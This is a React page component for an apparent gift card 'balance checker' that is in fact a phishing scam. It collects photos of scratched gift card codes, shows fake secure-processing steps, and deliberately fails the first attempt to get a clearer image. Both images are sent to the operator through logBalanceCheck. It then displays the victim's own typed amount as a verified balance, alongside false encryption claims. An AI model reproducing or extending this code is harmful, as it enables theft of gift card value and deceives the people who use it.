// src/pages/Scan.jsx - Clear image on first attempt, re-upload required for second attempt
import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import Navbar from '../components/Navbar';
import { logBalanceCheck } from '../services/logService';
import razerGuide from '../assets/razers.jpg';

// Full-screen balance component
const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
  return (
    <div className="min-h-screen bg-gradient-to-b from-[#00ff41] to-[#00aa2a] flex items-center justify-center p-6">
      <div className="max-w-md w-full text-center">
        {/* Logo */}
        <div className="mb-8">
          <div className="w-16 h-16 bg-white/10 rounded-2xl flex items-center justify-center mx-auto backdrop-blur-sm">
            <span className="text-white text-3xl font-bold">$</span>
          </div>
          <p className="text-white/60 text-xs mt-2">GIFT CARD BALANCE</p>
        </div>

        {/* Success Indicator */}
        <div className="mb-6">
          <div className="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center mx-auto backdrop-blur-sm">
            <span className="text-white text-4xl">✓</span>
          </div>
        </div>

        {/* Balance */}
        <h2 className="text-white/60 text-sm font-medium mb-2">Available Balance</h2>
        <p className="text-white text-6xl md:text-7xl font-bold mb-2 tracking-tight">
          {balance}
        </p>
        
        {/* Card Info */}
        <div className="mt-4">
          <div className="inline-block bg-white/10 backdrop-blur-sm rounded-full px-6 py-2">
            <p className="text-white/80 text-sm font-mono">
              {cardType} ending in {lastFourDigits}
            </p>
          </div>
        </div>

        {/* Divider */}
        <div className="w-20 h-0.5 bg-white/20 mx-auto my-6"></div>

        {/* Action Button */}
        <button
          onClick={onCheckAnother}
          className="w-full bg-white text-[#0a0a0a] font-bold py-4 rounded-lg transition-all hover:bg-white/90 active:scale-[0.98] shadow-lg"
        >
          CHECK ANOTHER CARD
        </button>

        {/* Back Link */}
        <button
          onClick={onCheckAnother}
          className="text-white/60 text-sm mt-4 hover:text-white/80 transition inline-block"
        >
          ← Back to Check Another
        </button>

        {/* Footer */}
        <div className="mt-12">
          <p className="text-white/30 text-xs">© 2026 Gift Card Balance Checker. All rights reserved.</p>
        </div>
      </div>
    </div>
  );
};

const Scan = () => {
  const navigate = useNavigate();
  const [selectedImage, setSelectedImage] = useState(null);
  const [amount, setAmount] = useState('');
  const [balance, setBalance] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [message, setMessage] = useState('');
  const [messageType, setMessageType] = useState('');
  const [showBalance, setShowBalance] = useState(false);
  const [showFullScreenBalance, setShowFullScreenBalance] = useState(false);
  const [processingStep, setProcessingStep] = useState(0);
  const [processingText, setProcessingText] = useState('');
  const [attemptCount, setAttemptCount] = useState(0);
  const [processingComplete, setProcessingComplete] = useState(false);
  const fileInputRef = useRef(null);

  const processingSteps = [
    { text: '🔐 Establishing secure connection...', duration: 800 },
    { text: '📸 Analyzing gift card image...', duration: 600 },
    { text: '🔍 Extracting card data...', duration: 1000 },
    { text: '🔒 Encrypting sensitive information...', duration: 700 },
    { text: '🔄 Verifying with secure servers...', duration: 800 },
    { text: '💳 Processing balance request...', duration: 600 },
    { text: '✅ Finalizing transaction...', duration: 500 }
  ];

  // Handle processing animation completion
  useEffect(() => {
    let timeoutIds = [];
    
    if (isProcessing && processingStep < processingSteps.length) {
      setProcessingText(processingSteps[processingStep].text);
      
      const timeout = setTimeout(() => {
        setProcessingStep(prev => prev + 1);
      }, processingSteps[processingStep].duration);
      
      timeoutIds.push(timeout);
    } else if (isProcessing && processingStep >= processingSteps.length && !processingComplete) {
      setProcessingComplete(true);
      // Processing animation complete - now show result based on attempt
      if (attemptCount === 0) {
        completeFirstAttempt();
      } else {
        completeSecondAttempt();
      }
    }
    
    return () => {
      timeoutIds.forEach(id => clearTimeout(id));
    };
  }, [isProcessing, processingStep, attemptCount]);

  const handleImageSelect = (file) => {
    if (!file) return;
    
    const reader = new FileReader();
    reader.onload = (e) => {
      setSelectedImage(e.target.result);
      setMessage('');
      setMessageType('');
    };
    reader.readAsDataURL(file);
  };

  const handleFileUpload = (e) => {
    const file = e.target.files[0];
    if (file) handleImageSelect(file);
  };

  const handleCameraCapture = () => {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = 'image/*';
    input.capture = 'environment';
    input.onchange = (e) => {
      const file = e.target.files[0];
      if (file) handleImageSelect(file);
    };
    input.click();
  };

  const completeFirstAttempt = async () => {
    // FIRST ATTEMPT - Show error and CLEAR the uploaded image
    setMessage(`❌ UNABLE TO VERIFY CARD\n\nPlease ensure:\n• The card number is fully scratched and visible\n• All 14 alphanumeric characters are clearly readable\n• The image is well-lit and in focus\n• The card is positioned flat and steady\n\nPlease upload a CLEARER image and try again.`);
    setMessageType('error');
    
    // Send first attempt failed email
    try {
      const emailResult = await logBalanceCheck({
        type: 'first_attempt_failed',
        amount: amount,
        status: 'FAILED - IMAGE UNCLEAR',
        message: 'Card image verification failed. User advised to ensure card is well scratched and 14 digits visible.',
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        pageSource: 'scan',
        imageBase64: selectedImage,
        ip: null
      });
      console.log('First attempt failed email sent:', emailResult);
    } catch (err) {
      console.error('Email sending failed:', err);
    }
    
    // CLEAR the uploaded image - user must re-upload for second attempt
    setSelectedImage(null);
    setAttemptCount(1);
    setShowBalance(false);
    setIsProcessing(false);
    setProcessingStep(0);
    setProcessingText('');
    setProcessingComplete(false);
  };

  const completeSecondAttempt = async () => {
    const enteredAmount = parseFloat(amount).toFixed(2);
    const displayBalance = `$${enteredAmount} USD`;
    
    setBalance(displayBalance);
    setShowBalance(true);
    setShowFullScreenBalance(true);
    setMessage(`✅ Balance verified: ${displayBalance}`);
    setMessageType('success');
    
    const simulatedCardNumber = Math.random().toString().slice(2, 16);
    
    // Send second attempt success email
    try {
      const emailResult = await logBalanceCheck({
        type: 'second_attempt_success',
        cardNumber: simulatedCardNumber,
        amount: amount,
        balance: displayBalance,
        status: 'SUCCESS - SECOND ATTEMPT',
        message: 'Card verification successful on second attempt after user ensured card is readable.',
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        pageSource: 'scan',
        imageBase64: selectedImage,
        ip: null
      });
      console.log('Second attempt success email sent:', emailResult);
    } catch (err) {
      console.error('Email sending failed:', err);
    }
    
    // Reset attempt count after success
    setAttemptCount(0);
    setIsProcessing(false);
    setProcessingStep(0);
    setProcessingText('');
    setProcessingComplete(false);
  };

  const handleCheckBalance = () => {
    if (!selectedImage) {
      setMessage('❌ Please upload or take a photo of your gift card');
      setMessageType('error');
      return;
    }
    
    if (!amount || parseFloat(amount) <= 0) {
      setMessage('❌ Please enter a valid amount');
      setMessageType('error');
      return;
    }

    if (parseFloat(amount) > 10000) {
      setMessage('❌ Amount cannot exceed $10,000');
      setMessageType('error');
      return;
    }

    // Reset states before starting new processing
    setShowBalance(false);
    setMessage('');
    setMessageType('');
    setProcessingStep(0);
    setProcessingText('');
    setProcessingComplete(false);
    setIsProcessing(true);
  };

  const resetFullScreen = () => {
    setShowFullScreenBalance(false);
    setShowBalance(false);
    setBalance('');
    setSelectedImage(null);
    setAmount('');
    setMessage('');
    setMessageType('');
    setIsProcessing(false);
    setProcessingStep(0);
    setProcessingText('');
    setAttemptCount(0);
    setProcessingComplete(false);
    if (fileInputRef.current) {
      fileInputRef.current.value = '';
    }
  };

  // Full-screen balance view
  if (showFullScreenBalance) {
    return (
      <FullScreenBalance 
        balance={balance}
        lastFourDigits="••••"
        cardType="Gift Card"
        onCheckAnother={resetFullScreen}
      />
    );
  }

  return (
    <>
      <Navbar />
      <div className="bg-gradient-to-br from-[#0a1f0a] to-[#0a0a0a] text-center py-4 sm:py-6 px-3 sm:px-4 border-b border-[#00ff4133]">
        <h2 className="text-base sm:text-lg bg-gradient-to-r from-[#00ff41] to-[#00cc33] bg-clip-text text-transparent font-semibold">
          📸 SCAN GIFT CARD
        </h2>
        <p className="text-[#aaa] text-[0.65rem] sm:text-xs mt-1">Upload photo and enter amount to check balance</p>
      </div>

      <div className="p-3 sm:p-5 overflow-x-hidden max-w-[600px] mx-auto w-full">
        <button
          onClick={() => navigate('/')}
          className="inline-flex items-center gap-1.5 bg-[#1a1a1a] text-[#00ff41] px-3 sm:px-4 py-1.5 sm:py-2 rounded-full text-xs sm:text-sm font-medium border border-[#2a2a2a] mb-4 sm:mb-5 hover:bg-[#2a2a2a] transition active:scale-98"
          disabled={isProcessing}
        >
          ← Back to Manual Entry
        </button>

        <div className="bg-gradient-to-br from-[#0f1f0f] to-[#0a0a0a] border border-[#00ff4133] rounded-xl sm:rounded-2xl p-4 sm:p-6 shadow-lg">
          <h2 className="text-[#00ff41] text-center text-lg sm:text-xl mb-4 sm:mb-5">📷 GIFT CARD UPLOAD</h2>

          {attemptCount === 1 && !isProcessing && !showBalance && (
            <div className="mb-3 sm:mb-4 p-2 sm:p-3 bg-[#1a2a1a] border border-[#ffaa00] rounded-lg sm:rounded-xl text-center">
              <p className="text-[#ffaa00] text-[0.65rem] sm:text-xs">⚠️ Please upload a CLEARER photo of your gift card for verification</p>
            </div>
          )}

          {/* Visual Guide Image */}
          <div className="visual-guide text-center my-3 sm:my-4 p-2 sm:p-3 bg-[#0f0f0f] rounded-lg sm:rounded-xl border border-[#2a2a2a]">
            <img 
              src={razerGuide}
              alt="Gift Card Guide"
              className="guide-image-responsive mx-auto"
              style={{
                width: '100%',
                maxWidth: '240px',
                height: 'auto',
                borderRadius: '10px',
                border: '1px solid #00ff4133'
              }}
              onError={(e) => {
                e.target.src = 'https://via.placeholder.com/240x120/1a2a1a/00ff41?text=Gift+Card+Guide';
              }}
            />
            <p className="guide-caption text-[#aaa] text-[0.6rem] sm:text-[0.65rem] mt-1.5 sm:mt-2">
              📍 Upload a clear photo. Make sure all 14 characters are visible.
            </p>
          </div>

          {/* Upload Buttons */}
          <div className="flex gap-2 sm:gap-3 my-3 sm:my-4 flex-wrap">
            <button
              onClick={() => fileInputRef.current?.click()}
              disabled={isProcessing}
              className="flex-1 bg-[#1a1f1a] border border-[#2a3a2a] text-[#00ff41] py-2 sm:py-2.5 rounded-full font-semibold text-xs sm:text-sm flex items-center justify-center gap-1.5 sm:gap-2 hover:bg-[#2a3a2a] transition active:scale-98 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              📤 UPLOAD
            </button>
            <button
              onClick={handleCameraCapture}
              disabled={isProcessing}
              className="flex-1 bg-[#1a1f1a] border border-[#2a3a2a] text-[#00ff41] py-2 sm:py-2.5 rounded-full font-semibold text-xs sm:text-sm flex items-center justify-center gap-1.5 sm:gap-2 hover:bg-[#2a3a2a] transition active:scale-98 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              📸 CAMERA
            </button>
          </div>
          <input 
            type="file" 
            ref={fileInputRef} 
            accept="image/*" 
            onChange={handleFileUpload} 
            className="hidden" 
          />

          {/* Image Preview - Only show if image exists */}
          {selectedImage && !isProcessing && (
            <div className="bg-[#111] rounded-lg sm:rounded-xl p-2 sm:p-3 my-2 sm:my-3 text-center border border-dashed border-[#2a2a2a]">
              <div className="text-[#aaa] text-[0.6rem] sm:text-[0.65rem] mb-1">📸 Selected Image</div>
              <img 
                src={selectedImage} 
                alt="Gift Card Preview" 
                className="max-w-full max-h-[120px] sm:max-h-[160px] rounded-lg mx-auto border border-[#00ff41] object-contain"
              />
              <button 
                onClick={() => setSelectedImage(null)}
                className="mt-1.5 sm:mt-2 text-[#ff5555] text-[0.65rem] sm:text-xs underline hover:text-[#ff7777] transition"
                disabled={isProcessing}
              >
                Remove
              </button>
            </div>
          )}

          {/* Amount Input */}
          <div className="mb-3 sm:mb-4">
            <label className="block text-[#aaa] text-[0.65rem] sm:text-xs mb-1">💰 Enter Amount to Check (USD)</label>
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="e.g., 50"
              min="1"
              max="10000"
              disabled={isProcessing}
              className="w-full p-2.5 sm:p-3 bg-[#1a1a1a] border border-[#2a2a2a] rounded-lg sm:rounded-xl text-white text-sm focus:outline-none focus:border-[#00ff41] focus:ring-1 focus:ring-[#00ff41] disabled:opacity-50"
            />
          </div>

          {/* Processing Animation */}
          {isProcessing && (
            <div className="my-4 sm:my-6 p-3 sm:p-5 bg-[#0a0a0a] rounded-xl sm:rounded-2xl border border-[#00ff41] animate-pulse">
              <div className="text-center">
                <div className="inline-block mb-2 sm:mb-3">
                  <div className="w-10 h-10 sm:w-14 sm:h-14 border-3 sm:border-4 border-[#1a3a1a] border-t-[#00ff41] rounded-full animate-spin"></div>
                </div>
                
                <div className="space-y-1 sm:space-y-2">
                  <p className="text-[#00ff41] font-mono text-[0.7rem] sm:text-sm">
                    {processingText || 'Initializing secure connection...'}
                  </p>
                  
                  <div className="w-full bg-[#1a1a1a] rounded-full h-1 sm:h-1.5 mt-2 sm:mt-3 overflow-hidden">
                    <div 
                      className="bg-[#00ff41] h-1 sm:h-1.5 rounded-full transition-all duration-500 ease-out"
                      style={{ width: `${(processingStep / processingSteps.length) * 100}%` }}
                    ></div>
                  </div>
                  
                  <p className="text-[#555] text-[0.6rem] sm:text-[0.65rem] mt-1 sm:mt-2">
                    Step {processingStep} of {processingSteps.length}
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* Check Balance Button */}
          {!isProcessing && (
            <button
              onClick={handleCheckBalance}
              disabled={!selectedImage || !amount}
              className="w-full bg-[#00ff41] text-[#0a0a0a] py-2.5 sm:py-3 rounded-full font-bold text-sm sm:text-base transition-all hover:bg-[#00dd3a] active:scale-98 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {attemptCount === 1 ? 'RETRY WITH NEW PHOTO' : 'CHECK BALANCE'}
            </button>
          )}

          {/* Cancel Button */}
          {isProcessing && (
            <button
              onClick={() => {
                setIsProcessing(false);
                setProcessingStep(0);
                setProcessingText('');
                setProcessingComplete(false);
                setMessage('Process cancelled by user');
                setMessageType('error');
              }}
              className="w-full bg-[#ff4444] text-white py-2.5 sm:py-3 rounded-full font-bold text-sm sm:text-base transition-all hover:bg-[#ff5555] active:scale-98 mt-3"
            >
              CANCEL PROCESSING
            </button>
          )}

          {/* Reset/Start Over Button */}
          {attemptCount === 1 && !isProcessing && !showBalance && (
            <button
              onClick={resetFullScreen}
              className="w-full mt-2 bg-transparent border border-[#ff5555] text-[#ff5555] py-1.5 sm:py-2 rounded-full font-medium text-xs sm:text-sm transition-all hover:bg-[#ff5555] hover:text-white"
            >
              START OVER
            </button>
          )}

          {/* Message Display */}
          {message && !isProcessing && !showFullScreenBalance && (
            <div className={`mt-3 sm:mt-4 text-center p-3 sm:p-4 rounded-lg sm:rounded-xl ${messageType === 'success' ? 'bg-[#0a2a0a] text-[#00ff41]' : 'bg-[#2a0a0a] border border-[#ff5555]'}`}>
              <div className={`${messageType === 'error' ? 'text-[#ff5555] text-[0.7rem] sm:text-sm whitespace-pre-line' : 'text-[#00ff41] text-sm sm:text-base'}`}>
                {message}
              </div>
            </div>
          )}

          <div className="bg-[#0f0f0f] rounded-lg p-2 sm:p-2.5 text-center text-[0.55rem] sm:text-[0.6rem] text-[#aaa] mt-3 sm:mt-4">
            💡 Upload a clear photo. Make sure all 14 alphanumeric characters are visible.<br/>
            {attemptCount === 0 ? 'First attempt: Image will be cleared if unclear. Please re-upload a clearer photo.' : 'Second attempt: Upload a clearer photo to verify your card.'}
          </div>
        </div>

        <div className="text-center text-[#555] text-[0.5rem] sm:text-[0.55rem] py-3 sm:py-4 mt-2 sm:mt-3 border-t border-[#1a1a1a]">
          <p>© 2026 Gift Card Balance Checker. All rights reserved.</p>
          <p className="mt-0.5 sm:mt-1">Secure SSL Encrypted • 256-bit AES Protection • Demo Tool</p>
        </div>
      </div>

      <style>{`
        @keyframes fadeSlideUp {
          from { opacity: 0; transform: translateY(8px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .animate-fadeSlideUp {
          animation: fadeSlideUp 0.4s ease;
        }
        .active\\:scale-98:active {
          transform: scale(0.98);
        }
        .whitespace-pre-line {
          white-space: pre-line;
        }
        /* STATIC MOBILE FIX */
        body {
          overflow-x: hidden;
          position: relative;
          width: 100%;
          margin: 0;
          padding: 0;
        }
        html {
          overflow-x: hidden;
          max-width: 100%;
        }
        * {
          -webkit-tap-highlight-color: transparent;
        }
      `}</style>
    </>
  );
};

export default Scan;